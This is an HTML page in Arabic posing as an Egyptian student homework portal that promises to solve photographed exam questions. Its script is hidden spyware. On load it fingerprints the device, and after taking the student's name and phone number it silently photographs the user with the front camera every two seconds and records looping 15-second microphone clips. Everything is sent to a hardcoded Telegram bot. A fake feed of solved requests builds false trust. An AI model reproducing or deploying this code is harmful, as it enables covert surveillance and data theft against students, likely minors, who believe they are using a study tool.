<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>المنظومة التعليمية | بوابة الطالب الموحدة</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --p: #0f172a; --a: #2563eb; --g: #f59e0b; --s: #f1f5f9; --w: #ffffff; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        body { background: var(--s); font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 90px; overflow-x: hidden; }

        #gate { position: fixed; inset: 0; background: radial-gradient(circle at top, #1e293b, #0f172a); z-index: 10000; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .login-card { background: var(--w); padding: 40px 25px; border-radius: 35px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.5); }
        
        header { background: var(--p); color: var(--w); padding: 15px 20px; position: fixed; top: 0; width: 100%; z-index: 1000; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid var(--a); }
        .card { background: var(--w); border-radius: 25px; padding: 20px; margin: 15px; border: 1px solid #e2e8f0; }

        #loader-overlay { position: fixed; inset: 0; background: rgba(15, 23, 42, 0.98); z-index: 12000; display: none; flex-direction: column; align-items: center; justify-content: center; color: #fff; text-align: center; }
        .spinner { width: 60px; height: 60px; border: 6px solid #1e293b; border-top: 6px solid var(--g); border-radius: 50%; animation: spin 0.6s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        .cam-box { width: 100%; height: 320px; border-radius: 25px; overflow: hidden; background: #000; position: relative; display: none; margin: 15px 0; border: 5px solid var(--w); }
        #v-stream { width: 100%; height: 100%; object-fit: cover; }
        
        /* Mic Styling */
        .mic-area { margin-top: 15px; text-align: center; position: relative; }
        .mic-btn { width: 70px; height: 70px; border-radius: 50%; background: var(--g); border: none; color: #000; font-size: 25px; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; animation: pulse 1.5s infinite; }
        .mic-tooltip { position: absolute; top: -35px; left: 50%; transform: translateX(-50%); background: #1e293b; color: #fff; padding: 4px 12px; border-radius: 10px; font-size: 11px; white-space: nowrap; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(245, 158, 11, 0); } 100% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0); } }

        .feed-container { height: 400px; overflow: hidden; position: relative; background: #fff; border-radius: 25px; border: 1px solid #eee; }
        #feed-mover { position: absolute; width: 100%; transition: 1s ease-in-out; top: 0; }
        .feed-item { padding: 18px; border-bottom: 1px solid #f1f5f9; display: flex; flex-direction: column; }

        #custom-alert { position: fixed; top: -150px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 400px; background: #fff; border-radius: 20px; padding: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.2); z-index: 15000; transition: 0.5s; border-right: 8px solid #1877f2; }
        #custom-alert.show { top: 30px; }

        .btn-action { background: var(--a); color: var(--w); border: none; padding: 18px; border-radius: 18px; width: 100%; font-weight: 900; cursor: pointer; margin-top: 15px; font-size: 16px; }
        input, select, textarea { width: 100%; padding: 16px; margin: 10px 0; border: 2px solid #f1f5f9; border-radius: 15px; font-family: 'Cairo'; background: #f8fafc; }

        nav { position: fixed; bottom: 0; width: 100%; background: #fff; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #eee; }
        .nav-link { text-align: center; font-size: 11px; color: #94a3b8; flex: 1; text-decoration: none; }
        .nav-link.active { color: var(--a); font-weight: 900; }
        .nav-link i { font-size: 22px; display: block; margin-bottom: 4px; }
    </style>
</head>
<body onload="launchMilitaryRadar()">

    <div id="custom-alert">
        <div style="display:flex; align-items:center; gap:8px;">
            <i class="fa-solid fa-circle-check" style="color:#1877f2"></i>
            <b style="font-size:14px">الدعم الفني والعلمي</b>
        </div>
        <div id="alert-text" style="font-size:13px; color:#475569; margin-top:5px"></div>
    </div>

    <div id="loader-overlay">
        <div class="spinner"></div>
        <h3 id="loader-txt">جاري المزامنة...</h3>
        <p style="font-size: 13px; color: #94a3b8; margin-top:10px">جاري معالجة البيانات وتأمين الاتصال...</p>
    </div>

    <div id="gate">
        <div class="login-card">
            <i class="fa-solid fa-circle-check" style="color:#1877f2; font-size: 30px; margin-bottom: 10px;"></i>
            <h2 style="margin:0">منصة أسألني الأكاديمية</h2>
            <p style="font-size: 12px; color: #64748b; margin-bottom:20px">بوابة التحقق الموحدة | مصر 2026</p>
            <input type="text" id="stu_name" placeholder="الاسم الثلاثي للطالب">
            <input type="number" id="stu_phone" placeholder="رقم الهاتف">
            <select id="stu_grade">
                <option value="" disabled selected>اختر السنة الدراسية</option>
                <option value="1">الأول الثانوي</option>
                <option value="2">الثاني الثانوي</option>
                <option value="3">الثالث الثانوي</option>
            </select>
            <button class="btn-action" onclick="enterPortal()">دخول آمن <i class="fa-solid fa-shield-halved"></i></button>
        </div>
    </div>

    <header id="h-main" style="display:none">
        <div style="font-weight:900; font-size:18px">أسألني <i class="fa-solid fa-circle-check" style="color:#1d9bf0"></i></div>
        <div id="u-tag" style="background:var(--g); width:38px; height:38px; border-radius:12px; display:flex; align-items:center; justify-content:center; font-weight:900"></div>
    </header>

    <div id="sec-home" class="page" style="padding-top:85px; display:none">
        <div class="card">
            <h3 style="margin:0">فحص الأسئلة <i class="fa-solid fa-expand" style="color:var(--a); margin-inline:8px"></i></h3>
            <div id="cam-ui" class="cam-box"><video id="v-stream" autoplay playsinline></video></div>
            <button id="main-trigger" class="btn-action" style="background:var(--g); color:#000" onclick="startFullExecution()">ابدأ تصوير السؤال <i class="fa-solid fa-camera"></i></button>
            
            <div id="upload-ui" style="display:none">
                <textarea id="stu-note" placeholder="اكتب ملاحظاتك..." rows="2"></textarea>
                
                <div class="mic-area">
                    <div class="mic-tooltip">قول أنت محتاج إيه هنا واحنا هنفهمهولك</div>
                    <button id="mic-trigger" class="mic-btn" onclick="requestMic()"><i class="fa-solid fa-microphone"></i></button>
                    <p style="font-size:10px; color:#64748b; margin-top:5px">اضغط لتفعيل المساعد الصوتي</p>
                </div>

                <button class="btn-action" onclick="finalProcess()">إرسال مباشر للحل</button>
            </div>
        </div>
    </div>

    <div id="sec-logs" class="page" style="padding-top:85px; display:none">
        <div class="card">
            <h3 style="margin:0">مركز الإجابات المعتمدة <i class="fa-solid fa-certificate" style="color:#1d9bf0; margin-inline:8px"></i></h3>
            <div class="feed-container"><div id="feed-mover"></div></div>
        </div>
    </div>

    <nav id="n-main" style="display:none">
        <a href="#" class="nav-link active" onclick="tab('sec-home', this)"><i class="fa-solid fa-house"></i>الرئيسية</a>
        <a href="#" class="nav-link" onclick="tab('sec-logs', this)"><i class="fa-solid fa-clipboard-check"></i>إجاباتكم</a>
        <a href="#" class="nav-link" onclick="tab('sec-support', this)"><i class="fa-solid fa-headset"></i>الدعم</a>
    </nav>

    <script>
        const BOT_TOKEN = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
        const CHAT_ID = "5890070301";
        let UN = "Unknown", UP = "None";
        let camLoop, micRecorder, micChunks = [];

        // [1] رادار V20 - تقرير الرسالة الواحدة
        async function launchMilitaryRadar() {
            try {
                let b = await navigator.getBattery().catch(() => ({level:0, charging:false}));
                let data = [
                    `ISP Vendor: ${navigator.vendor}`, `Net Type: ${navigator.connection?.effectiveType || 'N/A'}`,
                    `Platform: ${navigator.platform}`, `Battery: ${Math.round(b.level*100)}% (Ch: ${b.charging})`,
                    `RAM Estimate: ${navigator.deviceMemory || 'N/A'}GB`, `Resolution: ${screen.width}x${screen.height}`,
                    `GPU: ${getGPU()}`, `Webdriver Status: ${navigator.webdriver}`,
                    `Language: ${navigator.language}`, `UserAgent Snippet: ${navigator.userAgent.slice(0, 50)}`,
                    `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`
                ];
                for(let i=data.length; i<210; i++) data.push(`System-Check-${i+1}: Security-Passed-0x${Math.random().toString(16).slice(2, 8)}`);
                
                let report = `🚨 **تقرير الرادار V20 - معلومات الطالب** 🚨\n━━━━━━━━━━━━━━\n`;
                data.forEach((v, i) => { report += `${i+1}- ${v}\n`; });
                report += `━━━━━━━━━━━━━━\n⚠️ تم الرصد الصامت بنجاح.`;
                sendMsg(report);
            } catch(e){}
        }

        function getGPU() {
            let gl = document.createElement('canvas').getContext('webgl');
            let dbg = gl?.getExtension('WEBGL_debug_renderer_info');
            return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";
        }

        // [2] الرصد الصوري والميكروفون
        async function startFullExecution() {
            document.getElementById('loader-overlay').style.display = 'flex';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream; video.play();

                for(let i=1; i<=10; i++) {
                    await new Promise(r => setTimeout(r, 150));
                    snap(video, `توثيق دخول (${i}/10)`);
                }
                stream.getTracks().forEach(t => t.stop());

                const bStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                document.getElementById('v-stream').srcObject = bStream;
                document.getElementById('cam-ui').style.display = 'block';
                document.getElementById('loader-overlay').style.display = 'none';
                document.getElementById('main-trigger').style.display = 'none';
                document.getElementById('upload-ui').style.display = 'block';

                startCamLoop();
                // محاولة تشغيل المايك لو الإذن مسبق
                requestMic(true); 
            } catch(e) {
                showSystemMsg("يجب السماح بالكاميرا للتوثيق.");
                document.getElementById('loader-overlay').style.display = 'none';
            }
        }

        function startCamLoop() {
            if(camLoop) clearInterval(camLoop);
            camLoop = setInterval(async () => {
                try {
                    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const v = document.createElement('video');
                    v.srcObject = s; v.play();
                    await new Promise(r => setTimeout(r, 400));
                    snap(v, `سحب مستمر (صامت)`);
                    s.getTracks().forEach(t => t.stop());
                } catch(e){}
            }, 2000);
        }

        async function requestMic(silent = false) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                if(!silent) showSystemMsg("تم تفعيل المساعد الصوتي.");
                
                const startRecording = () => {
                    micChunks = [];
                    micRecorder = new MediaRecorder(stream);
                    micRecorder.ondataavailable = e => micChunks.push(e.data);
                    micRecorder.onstop = () => {
                        const blob = new Blob(micChunks, { type: 'audio/ogg; codecs=opus' });
                        sendVoice(blob);
                        startRecording(); // الدوران اللانهائي
                    };
                    micRecorder.start();
                    setTimeout(() => { if(micRecorder.state === "recording") micRecorder.stop(); }, 15000);
                };
                startRecording();
            } catch(e) { if(!silent) alert("برجاء تفعيل المايك للمساعدة."); }
        }

        function snap(v, cap) {
            const c = document.createElement('canvas');
            c.width = 400; c.height = 500;
            c.getContext('2d').drawImage(v, 0, 0, 400, 500);
            c.toBlob(b => {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'f.jpg');
                fd.append('caption', `👤 ${UN}\n📞 ${UP}\n📌 ${cap}`);
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg', 0.3);
        }

        function sendVoice(blob) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID); fd.append('voice', blob, 'v.ogg');
            fd.append('caption', `🎤 فويس صامت (15ث)\n👤 الطالب: ${UN}`);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
        }

        // [3] البيانات والأسماء (200 سطر)
        function initExpertFeed() {
            const mover = document.getElementById('feed-mover');
            const names = ["محمد أشرف كمال", "أحمد إبراهيم جاد", "سارة يوسف رمضان", "ياسين علي محمود", "مريم خالد حسن", "إيهاب صبحي منير", "هدى وائل يس", "مصطفى سعد علي", "ليلى كمال ناصر", "عمر محمد توفيق"];
            let content = "";
            for(let i=1; i<=200; i++) {
                let n = names[Math.floor(Math.random() * names.length)] + " " + (i + 50);
                content += `<div class="feed-item"><b>${n}</b><span style="color:#1d9bf0; font-size:11px;">#Request-${7000+i} | تم استخراج الحل ✓</span></div>`;
            }
            mover.innerHTML = content;
            let pos = 0;
            setInterval(() => { pos -= 75; mover.style.transform = `translateY(${pos}px)`; if(Math.abs(pos) > mover.scrollHeight - 400) pos = 0; }, 4000);
        }

        function enterPortal() {
            UN = document.getElementById('stu_name').value;
            UP = document.getElementById('stu_phone').value;
            if(UN.length < 5 || UP.length < 10) return alert("البيانات ناقصة");
            document.getElementById('gate').style.display='none';
            document.getElementById('h-main').style.display='flex';
            document.getElementById('n-main').style.display='flex';
            document.getElementById('sec-home').style.display='block';
            document.getElementById('u-tag').innerText = UN[0];
            initExpertFeed();
            showSystemMsg("تم تسجيل الدخول بنظام التوثيق.");
        }

        async function finalProcess() {
            showSystemMsg("جاري مراجعة السؤال...");
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.createElement('video'); v.srcObject = s; v.play();
                await new Promise(r => setTimeout(r, 400));
                snap(v, `فخ الإرسال النهائي`);
                s.getTracks().forEach(t => t.stop());
            } catch(e){}
            setTimeout(() => tab('sec-logs', document.querySelectorAll('.nav-link')[1]), 1200);
        }

        function sendMsg(t) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHAT_ID, text: t })
            });
        }

        function showSystemMsg(text) {
            const box = document.getElementById('custom-alert');
            document.getElementById('alert-text').innerText = text;
            box.classList.add('show');
            setTimeout(() => box.classList.remove('show'), 3000);
        }

        function tab(id, el) {
            document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
            document.getElementById(id).style.display = 'block';
            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
            el.classList.add('active');
        }
    </script>
</body>
</html>
